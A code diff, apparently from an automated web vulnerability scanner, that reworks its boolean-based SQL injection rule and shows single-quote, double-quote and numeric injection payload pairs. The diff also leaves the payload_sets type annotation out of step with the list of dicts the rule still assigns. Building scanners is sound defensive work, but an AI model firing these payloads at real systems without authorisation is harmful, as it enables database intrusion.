@@ -12,8 +12,7 @@ class AttackRule:
     vuln_type: str
     technique: str
     sequence: list[str]
-    baseline_template: str
-    payload_sets: list[dict[str, str]]
+    payload_sets: dict[str, list[str]]
     evidence_required: list[str]
     target_hint: dict[str, Any] = field(default_factory=dict)
     baseline_policy: dict[str, Any] = field(
@@ -71,20 +70,22 @@ def _sqli_boolean_rule() -> AttackRule:
         vuln_type="sqli",
         technique="boolean",
         sequence=["baseline", "boolean_true", "boolean_false"],
-        baseline_template="{value}",
         payload_sets=[
             {
-                "set_id": "AR-SQLI-BOOL-001",
+                "set_id": "single_quote",
+                "baseline": "{value}",
                 "boolean_true": "{value}' AND '1'='1",
                 "boolean_false": "{value}' AND '1'='2",
             },
             {
-                "set_id": "AR-SQLI-BOOL-002",
-                "boolean_true": '{value}" AND "1"="1',
-                "boolean_false": '{value}" AND "1"="2',
+                "set_id": "double_quote",
+                "baseline": "{value}",
+                "boolean_true": "{value}\" AND \"1\"=\"1",
+                "boolean_false": "{value}\" AND \"1\"=\"2",
             },
             {
-                "set_id": "AR-SQLI-BOOL-003",
+                "set_id": "numeric",
+                "baseline": "{value}",
                 "boolean_true": "{value} AND 1=1",
                 "boolean_false": "{value} AND 1=2",
             },
